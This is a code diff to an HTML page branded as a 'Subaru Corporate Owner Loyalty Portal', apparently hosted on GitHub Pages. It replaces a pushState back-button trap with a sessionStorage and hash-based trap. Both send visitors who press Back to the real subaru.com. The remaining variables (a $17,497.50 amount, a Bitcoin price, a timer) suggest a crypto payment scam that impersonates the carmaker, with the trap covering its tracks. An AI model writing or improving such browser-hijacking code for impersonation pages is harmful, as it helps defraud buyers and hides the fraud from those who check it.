@@ -5,6 +5,35 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Subaru Corporate Owner Loyalty Portal | 2026 Outback</title>
   <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    // BACK BUTTON REDIRECT FOR GITHUB PAGES - Single Link Solution
+    (function() {
+      if (window.backTrapDone) return;
+      window.backTrapDone = true;
+      
+      // Check if this is first visit
+      if (!sessionStorage.getItem('trapSet')) {
+        // First visit - mark and add hash
+        sessionStorage.setItem('trapSet', 'true');
+        location.href = location.pathname + '#main';
+        return; // Stop here, page reloads with hash
+      }
+      
+      // Not first visit - check if we're here via back button (no hash)
+      if (location.hash !== '#main') {
+        // Back button was clicked - redirect to subaru
+        window.location.replace('https://www.subaru.com/');
+        return;
+      }
+      
+      // We're on #main - set up listener for back button
+      window.onhashchange = function() {
+        if (location.hash !== '#main') {
+          window.location.replace('https://www.subaru.com/');
+        }
+      };
+    })();
+  </script>
 </head>
 <body class="bg-gray-900 text-gray-800 font-sans antialiased min-h-screen flex items-center justify-center p-4">
 
@@ -364,25 +393,6 @@
   </style>
 
   <script>
-    // BACK BUTTON REDIRECT - Only triggers on manual back button click
-    (function() {
-      // Prevent multiple executions
-      if (window.backTrapDone) return;
-      window.backTrapDone = true;
-      
-      // Create two silent history entries (pushState doesn't trigger events)
-      history.pushState({page: 'trap'}, '', '#trap');
-      history.pushState({page: 'main'}, '', '#main');
-      
-      // This ONLY fires when user clicks back/forward buttons manually
-      window.onpopstate = function(e) {
-        // If going back to the trap entry, redirect to subaru.com
-        if (!e.state || e.state.page === 'trap') {
-          window.location.replace('https://www.subaru.com/');
-        }
-      };
-    })();
-
     let selectedAmount = 17497.50;
     let btcPrice = 65000;
     let timerInterval;
